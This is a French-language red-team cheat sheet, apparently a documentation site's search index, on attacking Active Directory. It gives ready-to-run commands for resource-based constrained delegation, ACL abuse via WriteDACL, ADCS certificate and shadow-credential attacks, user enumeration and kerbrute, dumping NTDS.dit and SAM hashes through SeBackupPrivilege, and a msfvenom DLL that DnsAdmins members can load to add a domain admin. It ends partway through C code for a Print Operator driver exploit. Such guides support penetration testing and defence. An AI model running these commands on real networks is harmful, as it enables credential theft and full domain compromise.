<pre><code>impacket-rbcd -delegate-from 'paked$' -delegate-to 'cible$' -dc-ip '$dc$' -action 'write' 'domain.local'/'$utilisateur':'$Password'\n</code></pre> <p>R\u00e9cup\u00e9ration du ticket de l'utilisateur ayant des droits sur le compte machine cible :</p> <pre><code>impacket-getST -spn 'cifs/$cible' -impersonate Administrator -dc-ip '$dc' 'domain.local/paked$:$password'\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/Self-membership%20-%20WriteProperty/","title":"Self membership   WriteProperty","text":"<p>Si notre utilisateur a le droit <code>Self-Membership</code> sur un groupe, alors il est habilit\u00e9 \u00e0 se rajouter lui-m\u00eame en tant que membre de ce groupe.</p>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/Self-membership%20-%20WriteProperty/#depuis-windows","title":"\ud83c\udf54 Depuis Windows","text":"<p>Ajouter notre utilisateur au groupe cible :</p> <pre><code>net group \"groupe cible\" $user /add /domain\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ACE%20ACL%20DACL/WriteDACL%20%2B%20WriteOwner/","title":"WriteDACL + WriteOwner","text":"<p>Avec le droit <code>WriteDACL</code>, il est possible d'attribuer soi-m\u00eame des permissions \u00e0 l'objet cible. Le plus simple est donc de s'attribuer le droit <code>GenericAll</code> sur cet objet.</p> <p>[!Attention] Le faire avec PowerView / Le module powershell ActiveDirectory ne semble pas fonctionner correctement, il faut le faire en \u00e9crivant directement sur le LDAP.</p> <p>Attribuer le droit <code>GenericAll</code> \u00e0 l'utilisateur <code>user</code> sur le groupe <code>test</code></p> <pre><code>$ADSI = [ADSI]\"LDAP://CN=test,CN=Users,DC=offense,DC=local\"\n\n$IdentityReference = (New-Object System.Security.Principal.NTAccount(\"user\")).Translate([System.Security.Principal.SecurityIdentifier])\n\n$ACE = New-Object System.DirectoryServices.ActiveDirectoryAccessRule $IdentityReference,\"GenericAll\",\"Allow\"\n\n$ADSI.psbase.ObjectSecurity.SetAccessRule($ACE)\n\n$ADSI.psbase.commitchanges()\n</code></pre> <p>Il est maintenant possible d'avoir un contr\u00f4le total du groupe cible.</p>"},{"location":"Red%20Team/Windows/Active%20Directory/ADCS/Enumeration/","title":"Enumeration","text":"<p>Utilisation de Certipy-ad ou certify.exe afin d'interragir avec le serveur de certificat.</p>"},{"location":"Red%20Team/Windows/Active%20Directory/ADCS/Enumeration/#differentes-vulnerabilites","title":"Diff\u00e9rentes vuln\u00e9rabilit\u00e9s","text":""},{"location":"Red%20Team/Windows/Active%20Directory/ADCS/Enumeration/#linux-certipy-ad","title":"\ud83d\udc27 Linux (certipy-ad)","text":""},{"location":"Red%20Team/Windows/Active%20Directory/ADCS/Enumeration/#installation","title":"Installation:","text":"<pre><code>pip install certipy-ad\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ADCS/Enumeration/#enumeration-des-certificats","title":"Enum\u00e9ration des certificats:","text":"<pre><code>certipy-ad find -u john@corp.local -p Passw0rd -dc-ip 172.16.126.128\n\n# Possibilit\u00e9 de r\u00e9cup\u00e9rer les informations pour bloodhound:\n\ncertipy-ad find -u john@corp.local -p Passw0rd -bloodhound -dc-ip 172.16.126.128\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ADCS/Enumeration/#faire-une-demande-de-certificat-ici-une-demande-du-certificat-user-sur-le-serveur-de-certificat-corp-dc-ca-et-lutilisateur-john","title":"Faire une demande de certificat (ici une demande du certificat User, sur le serveur de certificat corp-DC-CA et l'utilisateur john):","text":"<pre><code>certipy-ad req -username john@corp.local -password Passw0rd -ca corp-DC-CA -target ca.corp.local -template User\n</code></pre> <p>Si, dans bloodhound, on voit qu'un utilisateur peut \u00e9crire sur l'attribut\u00a0<code>msDS-KeyCredentialLink</code>\u00a0d'un autre compte, il est possible de r\u00e9cup\u00e9rer le hash de cet autre compte (ici John peut \u00e9crire sur Jane):</p> <pre><code>certipy shadow auto -username John@corp.local -p Passw0rd -account Jane\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ADCS/Enumeration/#windows-certifyexe","title":"\ud83c\udf54 Windows (certify.exe)","text":""},{"location":"Red%20Team/Windows/Active%20Directory/ADCS/Enumeration/#enumeration-des-certificats_1","title":"Enum\u00e9ration des certificats:","text":"<pre><code>certify.exe cas\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ADCS/Enumeration/#enumerer-les-templates","title":"Enum\u00e9rer les templates:","text":"<pre><code>certify.exe find\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ADCS/Enumeration/#enumerer-les-templates-vulnerables-aux-differentes-attaques","title":"Enum\u00e9rer les templates vuln\u00e9rables aux diff\u00e9rentes attaques :","text":"<pre><code>certify.exe find /vulnerable\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/ADCS/Enumeration/#demander-un-certificat","title":"Demander un certificat:","text":"<pre><code>certify.exe /ca:host-serveur-certficat\\DC-CA /template:certificat-vuln /altname:nom-alternatif\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Linux/","title":"Depuis Linux","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Linux/#password-policy","title":"\ud83d\udc6e Password policy","text":"<p>Par d\u00e9faut, la politique de mot de passe est souvent configur\u00e9e comme ceci:</p> Policy Default Value Enforce password history 24 days Maximum password age 42 days Minimum password age 1 day Minimum password length 7 Password must meet complexity requirements Enabled Store passwords using reversible encryption Disabled Account lockout duration Not set Account lockout threshold 0 Reset account lockout counter after Not set <p>En ayant des creds valides il est possible d'\u00e9num\u00e9rer la politique de mot de passe avec crackmapexec:</p> <pre><code>netexec smb $ip -u $user -p $pass --pass-pol\n</code></pre> <p>Sans creds valides, possible avec une NULL SESSION. Via rpc:</p> <pre><code>rpcclient -U \"\" -N $ip\nquerydominfo\ngetdompwinfo\n</code></pre> <p>via enum4linux:</p> <pre><code>enum4linux -P $ip\n</code></pre> <p>Parfois il est possible de r\u00e9cup\u00e9rer des infos depuis le LDAP sans avoir de creds valides (anonymous bind). Ce n'est normalement plus le cas de base depuis Windows Server 2003 mais l'option peut avoir \u00e9t\u00e9 activ\u00e9e:</p> <pre><code>ldapsearch -h $ip -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"*\" | grep -m 1 -B 10 pwdHistoryLength\n</code></pre> <p>En direct depuis un windows:</p> <pre><code>net accounts\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Linux/#users","title":"\ud83e\udd3c Users","text":"<p>Sans creds, il peut \u00eatre possible d'avoir une liste d'user via une NULL session \u00e9galement. Via enum4linux:</p> <pre><code>enum4linux -U $ip  | grep \"user:\" | cut -f2 -d\"[\" | cut -f1 -d\"]\"\n</code></pre> <p>via rpc:</p> <pre><code>rpcclient -U \"\" -N $ip\nenumdomusers\n</code></pre> <p>via crackmapexec:</p> <pre><code>netexec smb $ip --users\n</code></pre> <p>Comme la politique de mot de passe, il est possible d'avoir une liste d'user si LDAP permet l'anonymous bind. Via ldapsearch:</p> <pre><code>ldapsearch -h $ip -x -b \"DC=INLANEFREIGHT,DC=LOCAL\" -s sub \"(&amp;(objectclass=user))\"  | grep sAMAccountName: | cut -f2 -d\" \"\n</code></pre> <p>Via windapsearch.py:</p> <pre><code>./windapsearch.py --dc-ip $ip -u \"\" -U\n</code></pre> <p>Il est possible de bruteforcer une liste d'utilisateurs via kerbrute. Cette m\u00e9thode a pour avantage de ne pas g\u00e9n\u00e9rer d'event \"failed to log on\" ou \"logon failure\":</p> <pre><code>kerbrute userenum -d inlanefreight.local --dc $ip /opt/wordlist.txt\n</code></pre> <p>Avec des creds valides, il est possibles d'utiliser crackmapexec:</p> <pre><code>netexec smb $ip -u $user -p $password --users\n</code></pre> <p>Avec des creds valides, \u00e9num\u00e9ration des users logg\u00e9s:</p> <pre><code>netexec smb $ip -u $user -p $password --loggedon-users\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Linux/#groupes","title":"\ud83d\udc68\u200d\ud83d\udc69\u200d\ud83d\udc66 groupes","text":"<p>Avec des creds valides, \u00e9num\u00e9ration des groupes pr\u00e9sents sur l'AD:</p> <pre><code>netexec smb $ip -u $user -p $password --groups\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/","title":"Depuis Windows","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#situational-awareness","title":"\ud83d\udd75\ufe0f Situational awareness","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#domaine-actuel","title":"Domaine actuel :","text":"<pre><code>Get-Domain #powerview\n---\nGet-ADDomain #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#objet-dun-autre-domaine","title":"Objet d'un autre domaine :","text":"<pre><code>Get-Domain -Domain test.local #powerview\n---\nGet-ADDomain -Identity test.local #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-le-sid-du-domaine","title":"Connaitre le SID du domaine :","text":"<pre><code>Get-DomainSID #powerview\n---\n(Get-ADDomain).DomainSID #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#domain-policy-pour-le-domaine-actuel","title":"Domain policy pour le domaine actuel :","text":"<pre><code>Get-DomainPolicyData #powerview\n---\n(Get-DomainPolicyData).systemaccess #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#domain-policy-pour-un-autre-domaine","title":"Domain policy pour un autre domaine :","text":"<pre><code>(Get-DomainPolicyData -domain test.local).systemaccess #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-le-dc-du-domaine-actuel","title":"Connaitre le DC du domaine actuel :","text":"<pre><code>Get-DomainController #powerview\n---\nGet-ADDomainController #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-le-dc-dun-autre-domaine","title":"Connaitre le DC d'un autre domaine :","text":"<pre><code>Get-DomainController -Domain test.local #powerview\n---\nGet-ADDomainController -DomainName test.local -Discover #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#lister-les-utilisateurs-du-domaine","title":"Lister les utilisateurs du domaine :","text":"<pre><code>Get-DomainUser #powerview\n---\nGet-ADUser -Filter * -Properties * #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-proprietes-dun-utilisateur-en-particulier","title":"Connaitre les propri\u00e9t\u00e9s d'un utilisateur en particulier :","text":"<pre><code>Get-DomainUser -Identity $utilisateur -Properties * #powerview\n---\nGet-ADUser -Filter * -Properties * | select -First 1 | Get-Member -MemberType *Property | select Name #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#chercher-une-chaine-de-caracteres-dans-les-attributs-dun-utilisateur-ici-built","title":"Chercher une cha\u00eene de caract\u00e8res dans les attributs d'un utilisateur (ici \"built\") :","text":"<pre><code>Get-DomainUser -LDAPFilter \"Description=*built*\" | Select name,Description #powershell\n---\nGet-ADUser -Filter 'Description -Like \"*built*\"' -Properties Description | select name,Description #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-la-liste-des-differents-pc-dans-le-domaine-actuel","title":"Connaitre la liste des diff\u00e9rents pc dans le domaine actuel :","text":"<pre><code>Get-DomainComputer | select Name #powerview\nGet-DomainComputer -OperatingSystem \"windows server 2019 standard\" #powerview\nGet-DomainComputer -Ping #powerview\n---\nGet-AdComputer -Filter * | select Name #powershell\nGet-AdComputer -Filter 'OperatingSystem -like \"*Windows Server 2019 Standard*\"' -Properties OperatingSystem | select Name,OperatingSystem #powershell\nGet-AdComputer -Filter * -Properties DNSHostName | %(Test-Connection -Count 1 -ComputerName $_.DNSHostName) #powershell\nGet-AdComputer -Filter * -Properties * #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-tout-les-groupes-du-domaine","title":"Connaitre tout les groupes du domaine :","text":"<pre><code>Get-DomainGroup | select Name #powerview\nGet-DomainGroup -Domain test.local #powerview\n---\nGet-ADGroupe -Filter * | select Name #powershell\nGet-AdGroup -Filter * -Properties * #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-tout-les-groupes-contenant-le-mot-admin","title":"Connaitre tout les groupes contenant le mot \"admin\" :","text":"<pre><code>Get-DomainGroup *admin* #powerview\n---\nGet-AdGroup -Filter 'Name -like \"*admin*\"' | select Name #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-membres-du-groupe-domain-admins","title":"Connaitre les membres du groupe \"Domain Admins\" :","text":"<pre><code>Get-DomainGroupMember -Identity \"Domain Admins\" -Recurse #powerview\n---\nGet-ADGroupMember -Identity \"Domain Admins\" -Recursive #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-groupes-dont-fait-parti-un-utilisateur","title":"Connaitre les groupes dont fait parti un utilisateur :","text":"<pre><code>Get-DomainGroup \u2013UserName studentuser1 #powerview\n---\nGet-ADPrincipalGroupMembership -Identity studentuser1 #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-groupes-locaux-sur-une-machine-necessite-les-droits-admin-sur-la-machine","title":"Connaitre les groupes locaux sur une machine (n\u00e9cessite les droits admin sur la machine) :","text":"<pre><code>Get-NetLocalGroup -ComputerName us-dc #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-membres-de-tout-les-groupes-locaux-sur-une-machine-necessite-les-droits-admin","title":"Connaitre les membres de tout les groupes locaux sur une machine (n\u00e9cessite les droits admin) :","text":"<pre><code>Get-NetLocalGroupMember -ComputerName us-dc #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-membres-du-groupe-local-administrators-sur-une-machine-necessite-les-droits-admin","title":"Connaitre les membres du groupe local \"Administrators\" sur une machine (n\u00e9cessite les droits admin) :","text":"<pre><code>Get-NetLocalGroupMember -ComputerName us-dc -GroupName Administrators #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#gpo","title":"\ud83e\udd5e GPO","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#lister-les-gpo-du-domaine","title":"Lister les GPO du domaine :","text":"<pre><code>Get-DomainGPO #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#lister-les-gpo-qui-utilisent-les-restricted-groups-ou-groupsxml","title":"Lister les GPO qui utilisent les \"restricted groups\" ou \"groups.xml\" :","text":"<pre><code>Get-DomainGPOLocalGroup #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-utilisateurs-qui-sont-dans-un-groupe-local-dune-machine-via-gpo","title":"Connaitre les utilisateurs qui sont dans un groupe local d'une machine via GPO :","text":"<pre><code>Get-DomainGPOComputerLocalGroupMapping \u2013ComputerIdentity student1.us.techcorp.local #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-machines-ou-un-utilisateur-est-membre-dun-groupe","title":"Connaitre les machines o\u00f9 un utilisateur est membre d'un groupe :","text":"<pre><code>Get-DomainGPOUserLocalGroupMapping -Identity studentuser1 -Verbose #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#ou","title":"\ud83e\udd35 OU","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#lister-les-ou-du-domaine","title":"Lister les OU du domaine :","text":"<pre><code>Get-DomainOU #powerview\n---\nGet-ADOrganizationalUnit -Filter * -Properties * #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#lister-les-gpo-sappliquant-a-une-ou-en-particulier","title":"Lister les GPO s'appliquant \u00e0 une OU en particulier :","text":"<pre><code>Get-DomainGPO -Identity '{7162874B-E6F0-45AD-A3BF-0858DA4FA02F}' #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-utilisateurs-membre-dun-groupe-local-sur-une-machine-dans-nimporte-quelle-ou-utilisant-les-gpo","title":"Connaitre les utilisateurs membre d'un groupe local sur une machine dans n'importe quelle OU utilisant les GPO :","text":"<pre><code>(Get-DomainOU).distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping #powershell\n</code></pre> <p>Idem, mais en ciblant une OU particuli\u00e8re :</p> <pre><code>(Get-DomainOU -Identity 'OU=Mgmt,DC=us,DC=techcorp,DC=local').distinguishedname | %{Get-DomainComputer -SearchBase $_} | Get-DomainGPOComputerLocalGroupMapping #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#acl","title":"\ud83d\udcdd ACL","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-acl-associees-a-un-objet-specifique","title":"Connaitre les ACL associ\u00e9es \u00e0 un objet sp\u00e9cifique :","text":"<pre><code>Get-DomainObjectAcl -Identity $monuser -ResolveGUIDs #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-acl-associees-a-un-objet-en-specifiant-son-chemin-ldap","title":"Connaitre les ACL associ\u00e9es \u00e0 un objet en sp\u00e9cifiant son chemin LDAP :","text":"<pre><code>Get-DomainObjectAcl -Searchbase \"LDAP://CN=Domain Admins,CN=Users,DC=us,DC=techcorp,DC=local\" -ResolveGUIDs -Verbose #powerview\n</code></pre> <p>Idem, en utilisant powershell (les guids ne seront pas r\u00e9solus) :</p> <pre><code>(Get-Acl'AD:\\CN=Administrator,CN=Users,DC=us,DC=techcorp,DC=local').Access #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#lister-les-aces-interessants-sur-le-domaine","title":"Lister les ACEs int\u00e9ressants sur le domaine :","text":"<pre><code>Find-InterestingDomainAcl -ResolveGUIDs #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-acl-associees-a-un-chemin-specifique","title":"Connaitre les ACL associ\u00e9es \u00e0 un chemin sp\u00e9cifique :","text":"<pre><code>Get-PathAcl -Path \"\\\\dc\\sysvol\" #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#trusts","title":"\ud83d\udc68\u200d\u2764\ufe0f\u200d\ud83d\udc68 Trusts","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-domaines-trustes-par-le-domaine-courant","title":"Connaitre les domaines trust\u00e9s par le domaine courant :","text":"<pre><code>Get-DomainTrust #powerview\nGet-DomainTrust -Domain domain.local #powerview\n---\nGet-ADTrust #powershell\nGet-ADTrust -Identity domain.local #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#avoir-des-details-sur-la-foret-actuelle","title":"Avoir des d\u00e9tails sur la for\u00eat actuelle :","text":"<pre><code>Get-Forest #powerview\n---\nGet-ADForest #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-tout-les-domaines-dans-la-foret-actuelle","title":"Connaitre tout les domaines dans la for\u00eat actuelle :","text":"<pre><code>Get-ForestDomain #powerview\n---\n(Get-ADForest).Domains #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-le-catalogue-global-de-la-foret-actuelle","title":"Connaitre le catalogue global de la for\u00eat actuelle :","text":"<pre><code>Get-ForestGlobalCatalog #powerview\n---\nGet-ADForest | select -ExpandProperty GlobalCatalogs #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-differents-trusts-dune-foret","title":"Connaitre les diff\u00e9rents trusts d'une for\u00eat :","text":"<pre><code>Get-ForestTrust #powerview\n---\nGet-ADTrust -Filter 'intraForest -ne $True' -Server (Get-ADforest).Name #powershell\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#user-hunting","title":"\ud83d\udd75\ufe0f User hunting","text":""},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-pc-ou-un-utilisateur-a-une-session","title":"Connaitre les pc o\u00f9 un utilisateur a une session :","text":"<pre><code>Find-domainUserLocation -Verbose -UserGroupIdentity \"$utilisateur\" #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Enumeration/Depuis%20Windows/#connaitre-les-pc-ou-lutilisateur-a-un-acces-admin","title":"Connaitre les pc o\u00f9 l'utilisateur a un acc\u00e8s admin :","text":"<pre><code>Find-DomainUserLocation -CheckAccess -UserGroupIdentity \"$utilisateur\" #powerview\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Backup%20Operator/","title":"Backup Operator","text":"<p>https://github.com/giuliano108/SeBackupPrivilege</p>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Backup%20Operator/#importation-des-dll-du-poc","title":"Importation des DLL du PoC","text":"<ul> <li> <p>Commandes PowerShell :\u00a0`Import-Module .\\SeBackupPrivilegeUtils.dll     ``Import-Module .\\SeBackupPrivilegeCmdLets.dll  </p> </li> <li> <p>Description :\u00a0Importe les modules n\u00e9cessaires pour exploiter le privil\u00e8ge de sauvegarde de s\u00e9curit\u00e9 (SeBackupPrivilege).</p> </li> </ul>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Backup%20Operator/#verification-du-statut-du-privilege","title":"V\u00e9rification du Statut du Privil\u00e8ge","text":"<ul> <li>Commande PowerShell : <code>Get-SeBackupPrivilege</code></li> <li>Description :\u00a0Affiche si le privil\u00e8ge de sauvegarde est activ\u00e9 ou d\u00e9sactiv\u00e9 pour l'utilisateur actuel.</li> </ul>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Backup%20Operator/#activation-du-privilege","title":"Activation du Privil\u00e8ge","text":"<ul> <li>Commande PowerShell : <code>Set-SeBackupPrivilege</code></li> <li>Description :\u00a0Active le privil\u00e8ge de sauvegarde pour l'utilisateur actuel.</li> </ul>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Backup%20Operator/#copie-de-fichiers-proteges","title":"Copie de Fichiers Prot\u00e9g\u00e9s","text":"<ul> <li> <p>Commande PowerShell : <code>Copy-FileSeBackupPrivilege 'C:\\Confidential\\2021 Contract.txt' .\\Contract.txt</code> </p> </li> <li> <p>Description :\u00a0Utilise le privil\u00e8ge de sauvegarde pour copier un fichier normalement prot\u00e9g\u00e9 par des droits d'acc\u00e8s restreints.</p> </li> </ul>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Backup%20Operator/#extraction-des-informations-de-sam-et-system","title":"Extraction des Informations de SAM et SYSTEM","text":"<p>Sauvegarde des Clefs de Registre SYSTEM et SAM</p> <ul> <li> <p>Commandes PowerShell : <code>reg save HKLM\\SAM SAM.SAV reg save HKLM\\SYSTEM SYSTEM.SAV</code> </p> </li> <li> <p>Description :\u00a0Cr\u00e9e une sauvegarde des ruches de registre SAM et SYSTEM, contenant des informations sur les comptes locaux et les configurations syst\u00e8me.</p> </li> </ul>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Backup%20Operator/#extraction-des-informations","title":"Extraction des Informations","text":"<ul> <li> <p>Commande Bash : <code>secretsdump.py -ntds ntds.dit -system SYSTEM -hashes lmhash:nthash LOCAL</code> </p> </li> <li> <p>Description :\u00a0Utilise\u00a0<code>secretsdump.py</code>\u00a0pour extraire des informations, telles que des hashes de mots de passe, \u00e0 partir des fichiers sauvegard\u00e9s.</p> </li> </ul>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Backup%20Operator/#acces-a-la-base-de-donnees-active-directory","title":"Acc\u00e8s \u00e0 la Base de Donn\u00e9es Active Directory","text":"<p>Copie de NTDS.dit</p> <ul> <li> <p>Commandes PowerShell : <code>Copy-FileSeBackupPrivilege E:\\Windows\\NTDS\\ntds.dit C:\\Tools\\ntds.dit</code>\u00a0ou\u00a0<code>robocopy /B E:\\Windows\\NTDS .\\ntds ntds.dit</code> </p> </li> <li> <p>Description :\u00a0Copie la base de donn\u00e9es NTDS.dit, qui contient les informations des utilisateurs et mots de passe de l'Active Directory, en utilisant le privil\u00e8ge de sauvegarde.</p> </li> </ul>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Dnsadmin/","title":"Dnsadmin","text":"<p>Le groupe DnsAdmins permet une administration partielle des services DNS sur un domaine Windows. Ce groupe peut \u00e9galement \u00eatre exploit\u00e9 pour une \u00e9l\u00e9vation de privil\u00e8ges, en raison de la capacit\u00e9 \u00e0 charger des biblioth\u00e8ques DLL arbitraires dans le processus du service DNS.</p>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Dnsadmin/#implications-en-matiere-de-securite","title":"Implications en mati\u00e8re de s\u00e9curit\u00e9","text":"<p>L'abus de ce privil\u00e8ge peut permettre une \u00e9l\u00e9vation de privil\u00e8ges \u00e0\u00a0<code>NT AUTHORITY\\SYSTEM</code>, le niveau de privil\u00e8ge le plus \u00e9lev\u00e9 sur un syst\u00e8me Windows. C'est parce que le service DNS s'ex\u00e9cute sous ce compte utilisateur.</p>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Dnsadmin/#generation-du-dll","title":"G\u00e9n\u00e9ration du .DLL","text":"<p>La premi\u00e8re \u00e9tape est de g\u00e9n\u00e9rer un fichier DLL qui, lorsqu'il est charg\u00e9, ex\u00e9cutera un code arbitraire. Vous pouvez utiliser msfvenom pour cela :</p> <pre><code>msfvenom -p windows/x64/exec cmd='net group \"domain admins\" netadm /add /domain' -f dll -o adduser.dll\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Dnsadmin/#transfert-du-dll-et-injection","title":"Transfert du .DLL et Injection","text":"<p>Apr\u00e8s avoir transf\u00e9r\u00e9 le fichier\u00a0<code>.dll</code>\u00a0sur la machine cible, utilisez\u00a0<code>dnscmd.exe</code>\u00a0pour configurer le serveur DNS afin qu'il charge la DLL :</p> <pre><code>dnscmd.exe /config /serverlevelplugindll C:\\Users\\netadm\\Desktop\\adduser.dll\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Dnsadmin/#redemarrage-du-service-dns","title":"Red\u00e9marrage du service DNS","text":"<p>Apr\u00e8s avoir configur\u00e9 la DLL, il vous faudra red\u00e9marrer le service DNS pour que la DLL soit charg\u00e9e et ex\u00e9cut\u00e9e.</p> <p>Pour arr\u00eater le service DNS :</p> <pre><code>sc stop dns\n</code></pre> <p>Pour d\u00e9marrer le service DNS :</p> <pre><code>sc start dns\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Print%20Operator/","title":"Print Operator","text":"<p>Le groupe \"print operator\" permet d'avoir le privil\u00e8ge \"SeLoadDriverPrivilege\" ce qui donne le droit de manager des imprimantes.</p> <pre><code>reg add hkcu\\System\\CurrentControlSet\\CAPCOM /v ImagePath /t REG_SZ /d \"\\??\\C:\\test\\Capcom.sys\"\nreg add hkcu\\System\\CurrentControlSet\\CAPCOM /v Type /t REG_DWORD /d 1\n</code></pre>"},{"location":"Red%20Team/Windows/Active%20Directory/Groupes/Print%20Operator/#creation-dun-drivers-a-compiler","title":"Cr\u00e9ation d'un drivers, \u00e0 compiler:","text":"<pre><code>#include &lt;windows.h&gt;\n#include &lt;assert.h&gt;\n#include &lt;winternl.h&gt;\n#include &lt;sddl.h&gt;\n#pragma comment(lib,\"advapi32.lib\") \n#pragma comment(lib,\"user32.lib\") \n#pragma comment(lib,\"Ntdll.lib\")\n#include &lt;windows.h&gt;\n#include &lt;assert.h&gt;\n#include &lt;winternl.h&gt;\n#include &lt;sddl.h&gt;\n#include &lt;stdio.h&gt;\n#include \"tchar.h\"\n\nLPWSTR getUserSid(HANDLE hToken)\n{\n\n    // Get the size of the memory buffer needed for the SID\n    //https://social.msdn.microsoft.com/Forums/vstudio/en-US/6b23fff0-773b-4065-bc3f-d88ce6c81eb0/get-user-sid-in-unmanaged-c?forum=vcgeneral\n    //https://msdn.microsoft.com/en-us/library/windows/desktop/aa379554(v=vs.85).aspx\n\n    DWORD dwBufferSize = 0;\n    if (!GetTokenInformation(hToken, TokenUser, NULL, 0, &amp;dwBufferSize) &amp;&amp;\n        (GetLastError() != ERROR_INSUFFICIENT_BUFFER))\n    {\n        wprintf(L\"GetTokenInformation failed, error: %d\\n\",\n            GetLastError());\n        return NULL;\n    }\n\n    